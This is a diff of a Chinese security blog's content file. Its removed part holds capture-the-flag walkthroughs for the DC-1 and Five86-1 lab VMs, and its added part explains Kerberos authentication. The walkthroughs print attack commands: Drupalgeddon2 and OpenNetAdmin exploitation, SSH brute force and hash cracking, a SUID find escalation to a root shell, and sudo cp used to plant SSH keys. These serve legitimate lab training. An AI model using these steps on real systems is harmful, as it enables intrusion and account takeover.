-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">################## ALL Port ###########################3</span></span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">| 2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA) </span><br><span class="line">|_ 256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian)) |_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">|/themes//CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">|/INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">| program version port/proto service</span><br><span class="line">...</span><br><span class="line">35460/tcp open status 1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="web-目录枚举"><a href="#web-目录枚举" class="headerlink" title="web 目录枚举"></a>web 目录枚举</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta">############# /robots.txt ################ #</span></span><br><span class="line"><span class="meta"># robots.txt</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># This file is to prevent the crawling and indexing of certain parts</span></span><br><span class="line"><span class="meta"># of your site by web crawlers and spiders run by sites like Yahoo!</span></span><br><span class="line"><span class="meta"># and Google. By telling these <span class="string">"robots"</span> where not to go on your site,</span></span><br><span class="line"><span class="meta"># you save bandwidth and server resources.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># This file will be ignored unless it is at the root of your host:</span></span><br><span class="line"><span class="meta"># Used:</span></span><br><span class="line"><span class="meta"># Ignored: #</span></span><br><span class="line"><span class="meta"># For more</span></span><br><span class="line"><span class="meta"># http:<span class="comment">//www.robotstxt.org/wc/robots.html #</span></span></span><br><span class="line"><span class="meta"># For syntax checking, see:</span></span><br><span class="line"><span class="meta"># http:<span class="comment">//www.sxw.org.uk/computing/robots/check.html</span></span></span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: <span class="number">10</span></span><br><span class="line"><span class="meta"># Directories</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/includes/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/misc/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/modules/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/profiles/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/scripts/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/themes/</span></span><br><span class="line"><span class="meta"># Files</span></span><br><span class="line"><span class="symbol">Disallow:</span> /CHANGELOG.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /cron.php</span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.mysql.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.pgsql.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.sqlite.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /install.php </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /LICENSE.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /MAINTAINERS.txt</span><br><span class="line"><span class="symbol">Disallow:</span> /update.php </span><br><span class="line"><span class="symbol">Disallow:</span> /UPGRADE.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /xmlrpc.php</span><br><span class="line"><span class="meta"># Paths (clean URLs) </span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/admin/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/comment/</span>reply/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/filter/</span>tips/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/node/</span>add/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/search/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>register/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>password/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>login/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>logout/</span><br><span class="line"><span class="meta"># Paths (no clean URLs)</span></span><br><span class="line"><span class="symbol">Disallow:</span> /?q=admin/ </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=comment<span class="meta-keyword">/reply/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=filter<span class="meta-keyword">/tips/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=node<span class="meta-keyword">/add/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=search/ </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/password/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/register/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/login/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/logout/</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-17-11-17-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-17-23屏幕截图"> </p>
-<p>逐一访问，得到如下信息：</p>
-<ul>
-<li>CMS：Drupal</li>
-<li>版本：7.X</li>
-</ul>
-<p><img src="2020-03-17-11-48-03%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-03屏幕截图"> </p>
-<h2 id="漏洞利用-Getshell"><a href="#漏洞利用-Getshell" class="headerlink" title="漏洞利用(Getshell)"></a>漏洞利用(Getshell)</h2><p>搜索历史漏洞，找一个可正常利用的，有的会因为各种问题无法使用</p>
-<p>在 MSF 上搜到几个，挑个利用：</p>
-<p><code>use exploit/unix/webapp/drupal_drupalgeddon2</code> </p>
-<p><img src="2020-03-17-11-48-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-51屏幕截图"> </p>
-<p><img src="2020-03-17-12-12-26%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-12-26屏幕截图"> </p>
-<p><img src="2020-03-17-12-18-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-18-40屏幕截图"></p>
-<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
-<li>登陆用户：www-data</li>
-<li><code>Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux</code> </li>
-<li><code>/etc/passwd</code> <ul>
-<li><code>flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</code> </li>
-</ul>
-</li>
-</ul>
-<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>查看当前目录，得到一个 flag， <code>flag4</code>用户下得到第二个 flag</p>
-<p><img src="2020-03-17-12-29-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-29-33屏幕截图"></p>
-<p>flag1 提示找 Drupal 的配置文件，百度一下 Drupal 的配置文件一般位于 <code>/var/www/sites/default/</code> </p>
-<p>文件名是 <code>settings.php</code> </p>
-<p> <code>find</code> 一下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name settings.php 2&gt;/dev/null </span><br><span class="line">/var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>
-
-<p>查看后得到 flag2 和一组用户名密码，登陆数据库得到两个用户名(第三个是我自己加的)，密码被加密，暂时没有作用</p>
-<p><img src="%E6%88%AA%E5%B1%8F2020-03-1712.36.32.png" alt="截屏2020-03-1712.36.32"> </p>
-<p><img src="2020-03-17-12-45-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-45-25屏幕截图"> </p>
-<p><img src="2020-03-17-13-16-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-13-16-07屏幕截图"> </p>
-<p><img src="%E6%88%AA%E5%B1%8F2020-03-1916.11.12.png" alt="截屏2020-03-1916.11.12"> </p>
-<h3 id="密码枚举"><a href="#密码枚举" class="headerlink" title="密码枚举"></a>密码枚举</h3><p>flag2 提到了密码爆破不是唯一的方法，可能是通过修改数据库内某个用户的密码，不想这么麻烦</p>
-<p>听歌的时候想到了还有个 flag4 用户，既然存在，那肯定有其道理，试试能不能枚举<br><code>hydra</code> 爆破 ssh，因为刚装的系统，密码字典还没下载，就先用 <code>john</code> 的，还真得到了密码</p>
-<p><img src="2020-03-17-14-25-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-14-25-48屏幕截图"> </p>
-<h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>登录 ssh，查看 SUID ，<code>find</code> 提权</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find	<span class="comment"># &lt;---</span></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown </span><br><span class="line">/usr/lib/openssh/ssh-keysign </span><br><span class="line">/usr/lib/eject/dmcrypt-get-device </span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper </span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>
-
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="%E6%88%AA%E5%B1%8F2020-03-1715.10.08.png" alt="截屏2020-03-1715.10.08"> </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"whoami"</span> \; </span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># cat thefinalflag.txt</span></span><br></pre></td></tr></table></figure>
-
-<p>都提权了，其他 flag 也就无所谓了</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">flag</span></span><br><span class="line"><span class="selector-tag">flag2</span></span><br><span class="line"><span class="selector-tag">flag4</span></span><br><span class="line"><span class="selector-tag">thefinalflag</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -1836,179 +1678,337 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       </tags>
   </entry>
   <entry>
-    <title>Five86-1</title>
-    <url>/2020/03/10/Five86-1/</url>
-    <content><![CDATA[<blockquote>
-<p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p>
-</blockquote>
-<br>
+    <title>Windows域认证体系—Kerberos认证</title>
+    <url>/2019/08/25/Windows%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94Kerberos%E8%AE%A4%E8%AF%81/</url>
+    <content><![CDATA[<p>Kerberos认证流程、含义</p>
+<a id="more"></a>
 
-<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> another purposely built vulnerable lab <span class="keyword">with</span> <span class="keyword">the</span> intent <span class="keyword">of</span> gaining experience <span class="keyword">in</span> <span class="keyword">the</span> world <span class="keyword">of</span> penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">get</span> root <span class="keyword">and</span> <span class="keyword">to</span> <span class="built_in">read</span> <span class="keyword">the</span> one <span class="keyword">and</span> only flag.</span><br><span class="line"></span><br><span class="line">Linux skills <span class="keyword">and</span> familiarity <span class="keyword">with</span> <span class="keyword">the</span> Linux command line are a must, <span class="keyword">as</span> <span class="keyword">is</span> <span class="keyword">some</span> experience <span class="keyword">with</span> basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be <span class="keyword">of</span> great assistance, <span class="keyword">but</span> you can always tweet <span class="keyword">me</span> <span class="keyword">at</span> @DCAU7 <span class="keyword">for</span> assistance <span class="keyword">to</span> <span class="keyword">get</span> you going again. But take note: I won't give you <span class="keyword">the</span> answer, instead, I'll give you an idea <span class="keyword">about</span> how <span class="keyword">to</span> move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> a VirtualBox VM built <span class="keyword">on</span> Debian <span class="number">64</span> bit, <span class="keyword">but</span> there shouldn't be any issues <span class="built_in">running</span> <span class="keyword">it</span> <span class="keyword">on</span> most PCs.</span><br><span class="line"></span><br><span class="line">Five86<span class="number">-1</span> has been tested successfully <span class="keyword">on</span> VMWare Player, <span class="keyword">but</span> <span class="keyword">if</span> there are any issues <span class="built_in">running</span> this VM <span class="keyword">in</span> VMware, have a <span class="built_in">read</span> <span class="keyword">through</span> <span class="keyword">of</span> this.</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> currently configured <span class="keyword">for</span> Bridged Networking, however, this can be changed <span class="keyword">to</span> suit your requirements. Networking <span class="keyword">is</span> configured <span class="keyword">for</span> DHCP.</span><br><span class="line"></span><br><span class="line">Installation <span class="keyword">is</span> simple - download <span class="keyword">it</span>, unzip <span class="keyword">it</span>, <span class="keyword">and</span> <span class="keyword">then</span> import <span class="keyword">it</span> <span class="keyword">into</span> VirtualBox <span class="keyword">or</span> VMWare <span class="keyword">and</span> away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, <span class="keyword">by</span> downloading <span class="keyword">it</span>, you accept full responsibility <span class="keyword">for</span> any unintentional damage <span class="keyword">that</span> this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying <span class="keyword">that</span>, there shouldn't be any problems, <span class="keyword">but</span> I feel <span class="keyword">the</span> need <span class="keyword">to</span> throw this out there just <span class="keyword">in</span> case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out <span class="keyword">to</span> <span class="keyword">the</span> members <span class="keyword">of</span> @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I'm also very interested <span class="keyword">in</span> hearing how people go <span class="keyword">about</span> solving these challenges, so <span class="keyword">if</span> you're up <span class="keyword">for</span> writing a walkthrough, please do so <span class="keyword">and</span> send <span class="keyword">me</span> a link, <span class="keyword">or</span> alternatively, follow <span class="keyword">me</span> <span class="keyword">on</span> Twitter, <span class="keyword">and</span> DM <span class="keyword">me</span> (you can unfollow <span class="keyword">after</span> you've DM'd <span class="keyword">me</span> <span class="keyword">if</span> you'd prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure>
+<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><br>
 
-<br>
-<br>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
-
-<p>主机存活：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
-
-<p>扫服务：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<hr>
-<br>
-
-<p>访问 80 端口，无有价值信息</p>
-<p>例行扫目录：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>经访问：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona	<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>搜索相关漏洞，得到远程命令执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br>
-
-<p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p>
-<br>
-
-<p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-<br>
-
-<p>使用 MSF：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<br>
-
-<p>测试发现存在 <code>Python</code> 使用交互式 shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p>
-<br>
-
-<p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<hr>
-<br>
-
-<p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br>
-
-<p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p>
-<p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p>
-<br>
-
-<p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>涉及知识的盲区了，特地去查询记录了一下</p>
-<br>
-
-<p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p>
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<br>
-
-<p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p>
-<br>
-
-
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br>
-
-<p>看目录，得到一个 <code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p>
-<br>
-<br>
-
-<p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<hr>
-<br>
-
-<p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p>
-<br>
-
-<p>不过，也是学到技能了</p>
-<br>
-
-<p>也可以使用如下方式：</p>
 <ul>
-<li>创建一个权限 <code>777</code> 的文件</li>
-<li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li>
-<li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li>
-<li><code>cat</code> 查看</li>
+<li>Kerberos认证</li>
+<li>域控制器（Domain Controller，DC）</li>
+<li>密钥分发中心（Key Distribution Center，KDC）</li>
+<li>帐户数据库（Account Database，AD）</li>
+<li>身份验证服务（Authentication Service，AS）</li>
+<li>入场卷[认证票据]（Ticket Granting Ticket，TGT）</li>
+<li>票据发放服务（Ticket Granting Service，TGS）</li>
+<li>票据（Ticket）</li>
+<li>Master Key / Long-term Key |长期密钥（被 Hash加密的用户密钥）</li>
+<li>Session Key / Short-term Key | 短期会话密钥</li>
+<li>krbtgt 账户</li>
 </ul>
 <br>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure>
-
+<p>关键词/名称含义：</p>
+<ul>
+<li><code>Account Database</code>：类似于 SAM的数据库，存储所有 Client的白名单，只有处于白名单中的 Client才可以成功申请 TGT</li>
+<li><code>Authentication Service</code>：为 Client生成 TGT的服务</li>
+<li><code>Ticket Granting Ticket</code>：入场券，通过入场券能够获得票据，是一种临时凭证的存在</li>
+<li><code>Ticket Granting Service</code>：为 Client生成某个服务的票据</li>
+<li><code>Ticket</code>：票据，网络对象互相访问的凭证</li>
+<li><code>Master Key</code>：长期密钥。将本机密码进行 Hash运算（NTML）得到一个 Hash Code, 我们一般管这样的 Hash Code叫做 Master Key</li>
+<li><code>Session Key</code>：短期会话密钥。一种只在一段时间内有效的 Key</li>
+<li><code>krbtgt账户</code>：每个域控制器都有一个 krbtgt的用户账户，是 KDC的服务账户，用来创建票据授予服务(TGS)加密的密钥</li>
+</ul>
 <br>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><br>
 
+<h3 id="Kerberos认证含义"><a href="#Kerberos认证含义" class="headerlink" title="Kerberos认证含义"></a>Kerberos认证含义</h3><blockquote>
+<p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为 客户机 / 服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。</p>
+</blockquote>
+<blockquote>
+<p>在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。——<a href="https://baike.baidu.com/item/Kerberos/5561682?fr=aladdin" target="_blank" rel="noopener">度娘百科</a></p>
+</blockquote>
+<br>
+
+<h3 id="Kerberos认证的三只狗头（脑补地狱三头犬）"><a href="#Kerberos认证的三只狗头（脑补地狱三头犬）" class="headerlink" title="Kerberos认证的三只狗头（脑补地狱三头犬）"></a>Kerberos认证的三只狗头（脑补地狱三头犬）</h3><ul>
+<li>Client</li>
+<li>Server</li>
+<li>DC（KDC）。在 Windows域环境中，KDC的角色由 DC（Domain Controller）来担当</li>
+</ul>
+<br>
+
+
+<h2 id="Kerberos大致流程"><a href="#Kerberos大致流程" class="headerlink" title="Kerberos大致流程"></a>Kerberos大致流程</h2><br>
+
+<ul>
+<li>Client 携带账户信息向 KDC上的 AS服务发送想要访问 Server A的请求，索要入场卷（ TGT）；AS通过 AD验证 Client账户的访问权，成功后返回 TGT</li>
+<li>Client 携带 TGT请求 KDC中的 TGS服务想要访问 Server A，索要票据（Ticket）；TGS验证 Client的 TGT，具有 Server A的访问权，返回 Ticket</li>
+<li>Client 携带 Ticket与服务器进行相互验证且成功，可以访问 Server A，但无权访问其他服务器</li>
+</ul>
+<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B.png" alt="域认证流程"></p>
+<br>
+
+<h2 id="Kerberos-认证三步走"><a href="#Kerberos-认证三步走" class="headerlink" title="Kerberos 认证三步走"></a>Kerberos 认证三步走</h2><br>
+
